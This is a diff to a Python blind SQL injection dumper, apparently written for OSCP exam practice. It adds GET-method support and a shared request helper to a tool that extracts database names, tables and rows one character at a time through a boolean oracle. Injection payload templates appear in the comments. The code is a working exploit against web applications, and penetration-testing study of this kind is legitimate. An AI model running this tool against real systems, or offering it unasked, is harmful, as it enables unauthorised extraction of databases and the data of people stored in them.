@@ -5,6 +5,7 @@
 # Binary search on ASCII per character (~8 requests/char, 0-255 range).
 # Flow: list DBs -> pick all/one -> list tables -> pick all/one -> dump rows.
 # Uses the proven group_concat pattern (one query per table, no LIMIT loop).
+# Supports GET (param in query string) and POST (param in body).
 # Self-written manual exploit (OSCP-appropriate). Confirm exam rules before use.
 # ---------------------------------------------------------------------------
 import requests
@@ -12,25 +13,46 @@ import sys
 
 # --- Interactive config ----------------------------------------------------
 print("=== blind SQLi dumper ===")
+METHOD       = input("Request method GET or POST                   : ").strip().upper()
+if METHOD not in ("GET", "POST"):
+    METHOD = "POST"
 URL          = input("Target URL                                   : ").strip()
-INJ_FIELD    = input("Injectable POST field name (e.g. username)   : ").strip()
-OTHER_FIELD  = input("Other POST field name (e.g. password)        : ").strip()
-OTHER_VALUE  = input("Other field value (anything, e.g. x)         : ").strip()
+INJ_FIELD    = input("Injectable field name (e.g. username / id)   : ").strip()
+# Second field only matters for POST logins (e.g. password). Leave blank for a
+# single-parameter endpoint such as GET /user?id=1.
+OTHER_FIELD  = input("Other field name (blank if none)             : ").strip()
+OTHER_VALUE  = input("Other field value (anything, e.g. x)         : ").strip() if OTHER_FIELD else ""
 # Template with [INJECT] where the boolean condition is spliced in.
-# Example that worked in testing:  kitty' AND [INJECT]-- -
+# POST login example: kitty' AND [INJECT]-- -
+# GET numeric example: 1 AND [INJECT]-- -
 TEMPLATE     = input("Payload template (use [INJECT] as placeholder): ").strip()
-# A string that appears ONLY when the query returns NO row (login failed).
+# A string that appears ONLY when the query returns NO row (condition FALSE).
 # Its ABSENCE from the response = condition TRUE.
 FALSE_MARKER = input("String shown only on FALSE/failed response   : ").strip()
+
+# --- Request sender (GET -> query string, POST -> body) --------------------
+def send(payload):
+    """Send one payload with the configured method and return the response.
+    GET puts the injectable field (and optional second field) in the query
+    string; POST puts them in the form body."""
+    if METHOD == "GET":
+        params = {INJ_FIELD: payload}
+        if OTHER_FIELD:
+            params[OTHER_FIELD] = OTHER_VALUE
+        return requests.get(URL, params=params)
+    data = {INJ_FIELD: payload}
+    if OTHER_FIELD:
+        data[OTHER_FIELD] = OTHER_VALUE
+    return requests.post(URL, data=data)
 
 # --- Startup oracle sanity check (fails loudly instead of dumping garbage) --
 print("\n[*] Sanity check...")
 def _probe(cond):
-    p = TEMPLATE.replace("[INJECT]", cond)
-    r = requests.post(URL, data={INJ_FIELD: p, OTHER_FIELD: OTHER_VALUE})
+    r = send(TEMPLATE.replace("[INJECT]", cond))
     return FALSE_MARKER not in r.text
 if not (_probe("1=1") and not _probe("1=2")):
     print("[!] Oracle FAILED: 1=1 should be TRUE and 1=2 FALSE.")
+    print(f"    method   = {METHOD}")
     print(f"    template = {TEMPLATE!r}")
     print(f"    marker   = {FALSE_MARKER!r}")
     sys.exit(1)
@@ -44,8 +66,7 @@ def oracle(condition):
     """Send one boolean condition, return True if the app signals TRUE.
     Stateless (no session) so a 'success' response never leaves a cookie
     that would make later requests all look logged-in."""
-    payload = TEMPLATE.replace("[INJECT]", condition)
-    r = requests.post(URL, data={INJ_FIELD: payload, OTHER_FIELD: OTHER_VALUE})
+    r = send(TEMPLATE.replace("[INJECT]", condition))
     return FALSE_MARKER not in r.text
 
 def extract_char(subquery, pos):
